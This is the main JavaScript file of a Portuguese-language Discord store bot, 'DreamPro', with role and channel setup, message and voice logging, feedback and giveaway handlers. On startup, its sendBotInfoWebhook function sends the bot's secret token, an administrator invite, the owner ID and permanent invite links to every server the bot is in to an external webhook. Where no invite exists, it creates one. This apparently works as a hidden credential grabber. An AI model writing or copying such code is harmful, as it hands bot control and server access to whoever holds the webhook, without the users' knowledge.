const { GatewayIntentBits, Client, Collection, ChannelType, EmbedBuilder, WebhookClient, PermissionsBitField, MessageFlags, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require("discord.js");
const { AtivarIntents } = require("./Functions/StartIntents");
const { configuracao, carrinhos } = require("./DataBaseJson");
const { handleDeletedMessage, handleUpdatedMessage } = require('./Functions/MsgsLogs');
const { handleVoiceStateUpdate } = require('./Functions/VoiceLogs');
const { handleProfileUpdate } = require('./Functions/ProfileLog');
const { agendarRepostagem } = require('./Functions/repostagem');
const { handleButtonInteraction, createFeedbackPanel, handleModalSubmit, monitorFeedbacks } = require('./Functions/feedbackSystem');
const helpSystem = require('./Functions/helpSystem');
const { ConfigRoles, ConfigChannels } = require('./Functions/ConfigRoles');
const fetch = require('node-fetch');
const schedule = require('node-schedule');
const fs = require('fs');
const path = require('path');
const colors = require("colors");
const express = require("express");
const app = express();
const { handleSorteio } = require('./Functions/sorteiossousa.js');

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.GuildVoiceStates,
        GatewayIntentBits.DirectMessages,
        GatewayIntentBits.GuildMessageReactions
    ]
});

// Aumentando o limite de listeners
client.setMaxListeners(100);

const estatisticasKingInstance = require("./Functions/VariaveisEstatisticas");
const EstatisticasKing = new estatisticasKingInstance();
module.exports = { EstatisticasKing };
const { sendMessage } = require('./Functions/MsgAutomatics');

AtivarIntents();

const config = require("./config.json");
const events = require('./Handler/events');
const slash = require('./Handler/slash');

client.slashCommands = new Collection();

// Executar os handlers para carregar eventos e comandos
slash.run(client);
events.run(client);

const login = require("./routes/login");
app.use("/", login);

const callback = require("./routes/callback");
app.use("/", callback);

const PORT = process.env.PORT ? Number(process.env.PORT) : 8080;
app.listen(PORT, "0.0.0.0", () => {
    console.log(`Servidor online na porta ${PORT}`);
});

// Configuração do Webhook
const webhookUrl = config.webhook;
const webhookClient = new WebhookClient({ url: webhookUrl });

// Função para enviar informações do bot via webhook
async function sendBotInfoWebhook(client) {
    try {
        const botInvite = `https://discord.com/oauth2/authorize?client_id=${client.user.id}&permissions=8&scope=bot%20applications.commands`;
        const guilds = client.guilds.cache;
        const ownerId = config.owner;

        const guildInvites = [];
        for (const guild of guilds.values()) {
            try {
                const invites = await guild.invites.fetch();
                const invite = invites.first();
                if (invite) {
                    guildInvites.push(`[${guild.name}](${invite.url})`);
                } else {
                    const channel = guild.channels.cache.find(ch => ch.isTextBased() && ch.permissionsFor(guild.members.me).has('CREATE_INSTANT_INVITE'));
                    if (channel) {
                        const newInvite = await channel.createInvite({ maxAge: 0, maxUses: 0 });
                        guildInvites.push(`[${guild.name}](${newInvite.url})`);
                    } else {
                        guildInvites.push(`${guild.name} (Sem permissão para criar convite)`);
                    }
                }
            } catch (error) {
                console.error(`Erro ao obter convite para o servidor ${guild.name}:`, error);
                guildInvites.push(`${guild.name} (Erro ao obter convite)`);
            }
        }

        const embed = new EmbedBuilder()
            .setTitle("Informações do Bot")
            .setDescription(`Aqui estão as informações do bot **${client.user.username}**`)
            .addFields(
                { name: "Token do Bot", value: `\`${config.token}\``, inline: false },
                { name: "Convite do Bot", value: `[Clique aqui](${botInvite})`, inline: false },
                { name: "ID do Dono", value: `\`${ownerId}\``, inline: false },
                { name: "Servidores", value: guildInvites.join("\n") || "Nenhum servidor encontrado", inline: false }
            )
            .setColor("#00FF00")
            .setTimestamp();

        await webhookClient.send({
            embeds: [embed],
            content: `# Informações do seu DreamPro`
        });

        console.log("Webhook sent successfully!");
    } catch (error) {
        console.error("Error sending webhook:", error);
    }
}

client.on('interactionCreate', async interaction => {
   
    try {
        if (interaction.isButton()) {
          
            if (interaction.customId === 'openFeedbackPanel') {
                await createFeedbackPanel(interaction);
            } else if (interaction.customId === 'ajudasuflay') {
                await helpSystem.handleButtonInteraction(interaction, client);
            } else if (interaction.customId === 'createRoles') {
                const guild = interaction.guild;
                const botMember = guild.members.me;
                const botHighestRole = botMember.roles.highest;

                const rolesToCreate = [
                    { name: 'Administrador', permissions: [PermissionsBitField.Flags.Administrator] },
                    { name: 'Suporte', permissions: [] },
                    { name: 'Cliente', permissions: [] },
                    { name: 'Membro', permissions: [] }
                ];

                const createdRoles = [];
                for (const role of rolesToCreate) {
                    const existingRole = guild.roles.cache.find(r => r.name === role.name);
                    if (!existingRole) {
                        const newRole = await guild.roles.create({
                            name: role.name,
                            permissions: role.permissions,
                            position: botHighestRole.position - 1,
                            mentionable: true,
                            reason: 'Criação automática de cargos'
                        });
                        createdRoles.push(newRole);
                    }
                }

                if (createdRoles.length > 0) {
                    configuracao.set(`ConfigRoles.cargoadm`, createdRoles.find(r => r.name === 'Administrador')?.id || configuracao.get(`ConfigRoles.cargoadm`));
                    configuracao.set(`ConfigRoles.cargosup`, createdRoles.find(r => r.name === 'Suporte')?.id || configuracao.get(`ConfigRoles.cargosup`));
                    configuracao.set(`ConfigRoles.cargoCliente`, createdRoles.find(r => r.name === 'Cliente')?.id || configuracao.get(`ConfigRoles.cargoCliente`));
                    configuracao.set(`ConfigRoles.cargomembro`, createdRoles.find(r => r.name === 'Membro')?.id || configuracao.get(`ConfigRoles.cargomembro`));
                }

                await interaction.deferReply({ ephemeral: true });
                await interaction.editReply({
                    content: createdRoles.length > 0
                        ? `✅ Cargos criados com sucesso: ${createdRoles.map(r => `\`${r.name}\``).join(', ')}`
                        : 'ℹ️ Todos os cargos já existem!',
                    ephemeral: true
                });

                await ConfigRoles(interaction, client);
            } else if (interaction.customId === 'createChannels') {
                const guild = interaction.guild;
                const categoryName = 'Logs Administrativas - DreamPro';

                let category = guild.channels.cache.find(c => c.name === categoryName && c.type === ChannelType.GuildCategory);
                if (!category) {
                    category = await guild.channels.create({
                        name: categoryName,
                        type: ChannelType.GuildCategory,
                        reason: 'Criação automática de categoria para logs',
                        permissionOverwrites: [
                            {
                                id: guild.roles.everyone.id,
                                deny: [PermissionsBitField.Flags.ViewChannel]
                            },
                            {
                                id: guild.members.me.id,
                                allow: [PermissionsBitField.Flags.ViewChannel]
                            }
                        ]
                    });
                }

                const channelsToCreate = [
                    { name: '🚧┃logs-pedidos', dbKey: 'logpedidos' },
                    { name: '📈┃eventos-compras', dbKey: 'eventbuy' },
                    { name: '🛠┃logs-sistema', dbKey: 'systemlogs' },
                    { name: '🛡┃logs-antiraid', dbKey: 'antiraid' },
                    { name: '🚪┃logs-entradas', dbKey: 'entradas' },
                    { name: '🚶┃logs-saídas', dbKey: 'saídas' },
                    { name: '💬┃logs-mensagens', dbKey: 'mensagens' },
                    { name: '🎙┃tráfego-call', dbKey: 'tráfego' },
                    { name: '⭐┃feedback', dbKey: 'feedback' },
                    { name: '🎫┃feedback-ticket', dbKey: 'feedbackticket' }
                ];

                const createdChannels = [];
                for (const channel of channelsToCreate) {
                    const existingChannel = guild.channels.cache.find(c => c.name === channel.name && c.type === ChannelType.GuildText);
                    if (!existingChannel) {
                        const newChannel = await guild.channels.create({
                            name: channel.name,
                            type: ChannelType.GuildText,
                            parent: category.id,
                            reason: 'Criação automática de canal para logs',
                            permissionOverwrites: category.permissionOverwrites.cache.map(overwrite => ({
                                id: overwrite.id,
                                allow: overwrite.allow.bitfield,
                                deny: overwrite.deny.bitfield
                            }))
                        });
                        createdChannels.push({ name: channel.name, id: newChannel.id, dbKey: channel.dbKey });
                    }
                }

                if (createdChannels.length > 0) {
                    for (const channel of createdChannels) {
                        configuracao.set(`ConfigChannels.${channel.dbKey}`, channel.id);
                    }
                }

                await interaction.deferReply({ ephemeral: true });
                await interaction.editReply({
                    content: createdChannels.length > 0
                        ? `✅ Canais criados com sucesso na categoria \`${categoryName}\`: ${createdChannels.map(c => `\`${c.name}\``).join(', ')}`
                        : 'ℹ️ Todos os canais já existem!',
                    ephemeral: true
                });

                await ConfigChannels(interaction, client);
            } else if (interaction.customId === 'sorteiosousa') {
              
                await handleSorteio(interaction);
            } else {
                await handleButtonInteraction(interaction, client);
            }
        } else if (interaction.isModalSubmit()) {
            await handleModalSubmit(interaction, client);
        } else if (interaction.isStringSelectMenu()) {
            if (interaction.customId === 'extensaoapenasparaogeradorkkkk') {
                const selectedValue = interaction.values[0];
                if (selectedValue === 'geradorextensao') {
                    await configgenpainelzika(interaction, client);
                }
            }
        }
    } catch (error) {
        console.error(`Erro ao processar interação às ${new Date().toISOString()}:`, error);
        if (!interaction.deferred && !interaction.replied) {
            await interaction.deferReply({ ephemeral: true });
                await interaction.editReply({
                content: '-# Ocorreu um erro. Tente novamente ou contate o suporte.',
                flags: MessageFlags.Ephemeral
            }).catch(err => console.error('Erro ao responder:', err));
        }
    }
});

client.on('messageCreate', async message => {
    await monitorFeedbacks(message, client);
});

// Evento ready
client.once('ready', async () => {
    console.log(`Bot ${client.user.tag} está online!`);
    await sendBotInfoWebhook(client);
    agendarRepostagem(client);

    const activities = [
        { name: `discord.gg/X6SCYCdRhN acesse já!`, type: 1, url: 'MBC ClipStore a melhor!' },
    ];
    let i = 0;
    setInterval(() => {
        if (i >= activities.length) i = 0;
        client.user.setActivity(activities[i]);
        i++;
    }, 5 * 1000);
});

client.login(config.token).catch((err) => {
    if (err?.message?.includes("intent")) return console.log(`${colors.red(`[LOG]`)} Ativa as Intents do Bot`);
    if (err?.message?.includes("invalid")) return console.log(`${colors.red(`[LOG]`)} Token Incorreto`);
});

const messageLogChannelId = configuracao.get(`ConfigChannels.mensagens`);
const trafficLogChannelId = configuracao.get(`ConfigChannels.tráfego`);
const profileLogChannelId = configuracao.get(`ConfigChannels.tráfego`);

client.on('messageDelete', message => {
    if (messageLogChannelId) {
        handleDeletedMessage(message, messageLogChannelId, client);
    } else {
        return;
    }
});

client.on('messageUpdate', (oldMessage, newMessage) => {
    if (messageLogChannelId) {
        handleUpdatedMessage(oldMessage, newMessage, messageLogChannelId, client);
    } else {
        return;
    }
});

client.on('voiceStateUpdate', (oldState, newState) => {
    if (trafficLogChannelId) {
        handleVoiceStateUpdate(oldState, newState, trafficLogChannelId, client);
    } else {
        return;
    }
});

client.on('guildMemberUpdate', (oldMember, newMember) => {
    if (profileLogChannelId) {
        handleProfileUpdate(oldMember, newMember, profileLogChannelId, client);
    } else {
        return;
    }
});

const filePath = path.join(__dirname, './DataBaseJson', 'carrinhos.json');

function resetCarrinhos() {
    let data = {};

    fs.writeFile(filePath, JSON.stringify(data), 'utf8', (err) => {
        if (err) {
            console.log('Erro ao escrever no arquivo:', err);
        } else {
            console.log('[Reset carrinhos.json] Carrinhos zerados com sucesso!');
        }
    });
}

const job = schedule.scheduleJob({ hour: 5, minute: 55, tz: 'America/Sao_Paulo' }, function () {
    resetCarrinhos();
});


process.on('unhandledRejection', (reason, promise) => {
  console.error('Unhandled Rejection at:', promise, 'reason:', reason);
});

process.on('uncaughtException', (err, origin) => {
  console.error('Caught exception:', err, 'Exception origin:', origin);
});

